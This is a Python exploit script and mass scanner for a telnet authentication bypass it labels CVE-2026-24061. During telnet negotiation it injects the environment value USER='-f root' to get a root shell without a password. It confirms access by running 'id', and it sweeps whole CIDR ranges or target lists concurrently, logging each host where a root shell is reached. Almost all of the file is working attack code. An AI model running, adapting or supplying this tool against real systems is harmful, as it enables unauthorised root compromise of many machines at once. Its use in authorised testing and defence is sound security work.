import argparse
import concurrent.futures
import socket
import struct
import sys
import threading
import time
import os
from enum import Enum
from typing import Tuple, Optional

# Third-party imports
try:
    from colorama import Fore, Style, init
    from netaddr import IPNetwork, IPAddress
except ImportError:
    print("Missing dependencies. Please run: pip install colorama netaddr")
    sys.exit(1)

# Initialize colorama
init(autoreset=True)

# ==============================================================================
# CONSTANTS & CONFIGURATION
# ==============================================================================
BANNER = """
    Telnet 'USER=-f root' Auth Bypass Scanner (CVE-2026-24061)
    ----------------------------------------------------------
    Industrialized Python PoC
"""

# Telnet Protocol Constants
IAC  = b'\xff' # Interpret as Command
DONT = b'\xfe'
DO   = b'\xfd'
WONT = b'\xfc'
WILL = b'\xfb'
SB   = b'\xfa' # Sub-negotiation Begin
SE   = b'\xf0' # Sub-negotiation End

# Options
OPT_NEW_ENVIRON = b'\x27' # 39 RFC 1572

# Sub-negotiation commands
IS   = b'\x00'
SEND = b'\x01'
INFO = b'\x02'

# Variable types
VAR  = b'\x00'
VALUE = b'\x01'
USERVAR = b'\x03'

class Status(Enum):
    VULNERABLE = "VULNERABLE"
    SAFE = "SAFE"
    ERROR = "ERROR"
    CLOSED = "CLOSED"

# ==============================================================================
# EXPLOIT CORE logic
# ==============================================================================
class TelnetExploiter:
    def __init__(self, target: str, port: int = 23, timeout: int = 5):
        self.target = target
        self.port = port
        self.timeout = timeout
        self.sock = None
        self.buffer = b""

    def connect(self) -> bool:
        try:
            self.sock = socket.create_connection((self.target, self.port), timeout=self.timeout)
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False

    def close(self):
        if self.sock:
            try:
                self.sock.close()
            except:
                pass

    def run(self) -> Tuple[Status, Optional[str]]:
        if not self.connect():
            return Status.CLOSED, "Connection failed or port closed"

        try:
            # We need to handle the negotiation manually to inject the payload
            # The malicious payload: USER = "-f root"
            payload_injected = False
            start_time = time.time()
            
            # Simple state machine to read IAC commands
            while time.time() - start_time < self.timeout:
                try:
                    data = self.sock.recv(1024)
                    if not data:
                        break
                    
                    self.buffer += data
                    
                    # Process IAC commands
                    i = 0
                    while i < len(data):
                        if data[i:i+1] == IAC:
                            # Parse Command
                            if i + 2 < len(data):
                                cmd = data[i+1:i+2]
                                opt = data[i+2:i+3]
                                
                                if cmd == DO and opt == OPT_NEW_ENVIRON:
                                    # Server asks: DO NEW-ENVIRON
                                    # We reply: WILL NEW-ENVIRON
                                    self.sock.sendall(IAC + WILL + OPT_NEW_ENVIRON)
                                    # Wait for SB...
                                    
                                elif cmd == SB and opt == OPT_NEW_ENVIRON:
                                    # Handle Sub-negotiation
                                    # Look for SE
                                    se_idx = data.find(IAC + SE, i)
                                    if se_idx != -1:
                                        # Parse content: typically it's SEND
                                        sub_content = data[i+3:se_idx]
                                        if sub_content.startswith(SEND):
                                            # We construct the malicious response
                                            # IAC SB NEW-ENVIRON IS VAR "USER" VALUE "-f root" IAC SE
                                            
                                            payload = (
                                                IAC + SB + OPT_NEW_ENVIRON + IS +
                                                VAR + b"USER" +
                                                VALUE + b"-f root" +
                                                IAC + SE
                                            )
                                            self.sock.sendall(payload)
                                            payload_injected = True
                                    
                                i += 2 # Skip cmd+opt
                            else:
                                pass # Wait for more data
                        i += 1
                        
                    # Check for successful root login
                    decoded = self.buffer.decode(errors='ignore')
                    if "uid=0(root)" in decoded or "#" in decoded[-50:]: 
                        # Only confirmed if we see a prompt or id output WITHOUT "Login incorrect"
                        if "Login incorrect" not in decoded and "Password:" not in decoded:
                             return Status.VULNERABLE, decoded
                    
                except socket.timeout:
                    break
            
            # If we didn't confirm vuln inside the loop, try sending 'id' just in case we are in.
            if payload_injected:
                 try:
                     self.sock.sendall(b"id\n")
                     time.sleep(0.5)
                     resp = self.sock.recv(1024).decode(errors='ignore')
                     if "uid=0(root)" in resp:
                         return Status.VULNERABLE, resp
                 except:
                     pass

            return Status.SAFE, "Auth required or payload ignored"

        except Exception as e:
            return Status.ERROR, str(e)
        finally:
            self.close()

# ==============================================================================
# SCANNER & REPORTING
# ==============================================================================
class MassScanner:
    def __init__(self, targets, threads=10, timeout=5, output_file=None):
        self.targets = targets
        self.threads = threads
        self.timeout = timeout
        self.output_file = output_file
        self.lock = threading.Lock()
        
    def expand_targets(self):
        """Yields single IPs from the target list (handles CIDRs and Strings)"""
        for t in self.targets:
            t = t.strip()
            if not t: continue
            try:
                if "/" in t:
                    for ip in IPNetwork(t):
                        yield str(ip)
                else:
                    yield t
            except:
                print(f"{Fore.RED}[!] Invalid target format: {t}{Style.RESET_ALL}")

    def log_result(self, ip, status, message):
        with self.lock:
            if status == Status.VULNERABLE:
                print(f"{Fore.GREEN}[VULN] {ip} : ROOT SHELL ACCESSED!{Style.RESET_ALL}")
                print(f"       -> Proof: {message.strip()[:100]}...")
            elif status == Status.SAFE:
                print(f"{Fore.YELLOW}[SAFE] {ip} : {message}{Style.RESET_ALL}")
            elif status == Status.ERROR:
                print(f"{Fore.RED}[ERR ] {ip} : {message}{Style.RESET_ALL}")
            elif status == Status.CLOSED:
                # print(f"{Fore.CYAN}[CLOS] {ip} : {message}{Style.RESET_ALL}")
                pass
                
            if self.output_file:
                with open(self.output_file, "a") as f:
                    f.write(f"{ip},{status.value},{message}\n")

    def scan_host(self, ip):
        exploiter = TelnetExploiter(ip, timeout=self.timeout)
        status, msg = exploiter.run()
        self.log_result(ip, status, msg)

    def run(self):
        print(f"{Fore.BLUE}[*] Starting scan using {self.threads} threads...{Style.RESET_ALL}")
        
        target_gen = self.expand_targets()
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
            executor.map(self.scan_host, target_gen)
            
        print(f"\n{Fore.BLUE}[*] Scan Complete.{Style.RESET_ALL}")

# ==============================================================================
# CLI HANDLER
# ==============================================================================
def parse_args():
    parser = argparse.ArgumentParser(description="Scan for Telnet CVE-2026-24061")
    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument("-t", "--target", help="Single IP (10.10.10.1) or CIDR (10.10.10.0/24)")
    group.add_argument("-f", "--file", help="File containing list of IPs/CIDRs")
    
    parser.add_argument("-T", "--threads", type=int, default=10, help="Number of concurrent threads")
    parser.add_argument("--timeout", type=int, default=5, help="Socket timeout in seconds")
    parser.add_argument("-o", "--output", help="Output CSV file for results")
    
    return parser.parse_args()

def main():
    print(BANNER)
    args = parse_args()
    
    targets = []
    if args.target:
        targets.append(args.target)
    elif args.file:
        if not os.path.exists(args.file):
            print(f"[!] File not found: {args.file}")
            sys.exit(1)
        with open(args.file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]

    scanner = MassScanner(
        targets=targets, 
        threads=args.threads, 
        timeout=args.timeout, 
        output_file=args.output
    )
    scanner.run()

if __name__ == "__main__":
    main()
